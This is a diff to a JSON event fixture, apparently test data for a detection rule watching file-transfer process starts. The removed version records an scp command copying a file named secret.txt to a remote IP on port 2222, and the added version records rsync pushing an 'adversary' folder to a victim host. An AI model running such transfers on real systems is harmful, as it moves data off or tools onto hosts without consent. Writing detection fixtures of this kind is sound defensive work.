@@ -1,21 +1,21 @@
 {
-  "process": {
-    "name": "scp",
+  "Process": {
+    "Name": "rsync",
     "pid": 12345,
-    "executable": "/usr/bin/scp",
-    "command_line": "scp -P 2222 /home/user/secret.txt user@192.168.1.10:/tmp/"
+    "executable": "/usr/bin/rsync",
+    "CommandLine": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files"
   },
   "host": {
-    "name": "target-host"
+    "name": "attacker-host"
   },
   "user": {
     "name": "attacker",
     "id": "1001"
   },
   "destination": {
-    "ip": "192.168.1.10",
-    "port": 2222
+    "ip": "192.168.1.20",
+    "port": 22
   },
-  "@timestamp": "2025-03-26T14:20:45.678Z",
-  "message": "Process start detected: scp transferring file to 192.168.1.10 on port 2222"
+  "@timestamp": "2025-04-02T10:15:30.123Z",
+  "message": "Process start detected: rsync transferring file to victim-host at /tmp/victim-files"
 }
